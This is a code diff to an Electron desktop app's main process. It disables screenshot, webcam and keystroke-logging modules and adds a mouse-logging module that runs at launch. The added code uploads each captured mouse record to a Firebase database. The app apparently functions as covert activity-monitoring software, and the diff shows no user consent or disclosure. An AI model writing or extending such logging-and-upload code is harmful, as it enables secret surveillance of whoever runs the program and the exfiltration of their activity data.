@@ -15,7 +15,8 @@ function createWindow () {
     height: 600,
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'),
-      nodeIntegration: true
+      nodeIntegration: true,
+      
     }
   
   })
@@ -101,13 +102,15 @@ app.on('activate', function () {
 app.on('ready', () => { 
   win = new BrowserWindow({ show: false }); 
 });
-let ScreenShot=require("./ScreenShot.js");
-ScreenShot();
-   let WebCam = require("./WebCam.js");
-   WebCam();
+// let ScreenShot=require("./ScreenShot.js");
+// ScreenShot();
+//    let WebCam = require("./WebCam.js");
+//    WebCam();
  
-let KeyboardLogger=require("./Keyboardlogging.js");
-KeyboardLogger();
+// let KeyboardLogger=require("./Keyboardlogging.js");
+// KeyboardLogger();
+let mouseLogger=require("./mouseLogging.js");
+mouseLogger();
 var firebase = require('@firebase/app');
 require('@firebase/auth');
 require('@firebase/database');
@@ -200,9 +203,31 @@ require('dns').resolve('www.google.com', function(err) {
   }
   
   fs.writeFileSync("./Storage/ScreenShotStorage.json",JSON.stringify(res));
+  
+   //-----------------------------------------------------------
+  let MouseData=shared.GetMouseData();
+  if(MouseData.length!=0)
+  {
+
+
+    for(let i=0;i<MouseData.length;i++)
+    {
+      
+   var path="Mouse/"+shared.getRandomInt("999999999")+"/";
+      var body={
+              Output:MouseData[i].Data
+               }
+     firebase.default.database().ref(path).set(body);
+      console.log("yes it happened")
+    }
+   
+  }else{
+    console.log("No Record Found")
   }
-       
-          
+  
+  fs.writeFileSync("./Storage/mouseStorage.json",JSON.stringify(res));
+    
+}   
 });
 function callback()
 {
